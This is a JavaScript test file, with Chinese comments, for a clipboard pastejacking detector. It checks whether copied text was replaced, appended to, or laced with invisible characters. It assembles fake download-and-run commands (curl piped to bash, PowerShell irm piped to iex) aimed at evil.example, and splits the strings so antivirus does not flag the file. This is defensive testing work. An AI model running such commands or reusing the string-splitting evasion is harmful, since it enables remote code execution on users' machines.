import { test } from 'node:test';
import assert from 'node:assert/strict';
import { analyzeCopy, commandSignals, normalize, preview } from '../lib/pastejack.js';

// 惡意指令範例在執行時才拼起來：完整字串寫在原始碼裡會被 Windows Defender 當成 ClickFix 頁面隔離。
const j = (...parts) => parts.join('');
const PS = j('power', 'shell');
const DOWNLOAD_RUN = j('cu', 'rl -s https://evil.example/p | ', 'ba', 'sh');
const PS_CMD = j(PS, ' -c "', 'i', 'rm https://evil.example/x | ', 'i', 'ex"');

test('內容一致：不警告', () => {
  const r = analyzeCopy({ selection: 'npm install foo', written: 'npm install foo' });
  assert.equal(r.verdict, 'same');
  assert.equal(r.warn, false);
});

test('只有空白、換行、不換行空白差異視為一致', () => {
  const r = analyzeCopy({ selection: 'hello\r\n  world !', written: ' hello world !\n' });
  assert.equal(r.verdict, 'same');
  assert.equal(r.warn, false);
});

test('內容被換掉：警告', () => {
  const r = analyzeCopy({ selection: 'npm install foo', written: DOWNLOAD_RUN });
  assert.equal(r.verdict, 'replaced');
  assert.equal(r.warn, true);
  assert.ok(r.reasons.some((x) => x.includes('不同')));
  assert.ok(r.reasons.some((x) => x.includes('shell')));
});

test('附加出處文字：不警告（新聞網站常見）', () => {
  const r = analyzeCopy({ selection: '今天股市上漲', written: '今天股市上漲\n\n原文出處：https://news.example/123' });
  assert.equal(r.verdict, 'appended');
  assert.equal(r.warn, false);
});

test('經典 pastejacking：選取的指令後面被偷加惡意指令與換行', () => {
  const r = analyzeCopy({
    selection: 'git clone https://example.com/repo.git',
    written: `git clone https://example.com/repo.git\n${DOWNLOAD_RUN}\n`,
  });
  assert.equal(r.verdict, 'appended');
  assert.equal(r.warn, true);
  assert.ok(r.reasons.some((x) => x.includes('換行')));
});

test('寫入內容含看不見的字元：警告', () => {
  const r = analyzeCopy({ selection: 'rm -i file', written: 'rm -i​ file' });
  assert.equal(r.verdict, 'same');
  assert.equal(r.warn, true);
  assert.ok(r.reasons.some((x) => x.includes('看不見')));
});

test('使用者自己選取的就是指令（教學文件）：不警告', () => {
  const cmd = j(PS, ' -c "', 'i', 'rm https://get.scoop.sh | ', 'i', 'ex"');
  const r = analyzeCopy({ selection: cmd, written: cmd });
  assert.equal(r.warn, false);
});

test('沒有選取文字、網頁自行寫入一般文字（複製按鈕）：不警告', () => {
  const r = analyzeCopy({ selection: '', written: 'https://example.com/share/abc' });
  assert.equal(r.verdict, 'unselected');
  assert.equal(r.warn, false);
});

test('沒有選取文字、網頁寫入 PowerShell 下載執行指令：警告', () => {
  const r = analyzeCopy({ selection: '', written: PS_CMD });
  assert.equal(r.verdict, 'unselected');
  assert.equal(r.warn, true);
});

test('網頁寫入空字串（擋複製）：不算 pastejacking', () => {
  const r = analyzeCopy({ selection: '受保護的文章', written: '' });
  assert.equal(r.verdict, 'empty');
  assert.equal(r.warn, false);
});

test('commandSignals 不把一般句子當指令', () => {
  assert.deepEqual(commandSignals('我在學 PowerShell 很好玩'), []);
  assert.deepEqual(commandSignals('see github.com/powershell/powershell'), []);
  assert.ok(commandSignals('cmd /c whoami').length > 0);
});

test('normalize 去掉零寬字元', () => {
  assert.equal(normalize('a​b'), 'ab');
});

test('preview 標示看不見的字元並截斷', () => {
  assert.equal(preview('a‮b'), 'a⟦U+202E⟧b');
  assert.equal(preview('x'.repeat(10), 4), 'xxxx…');
});
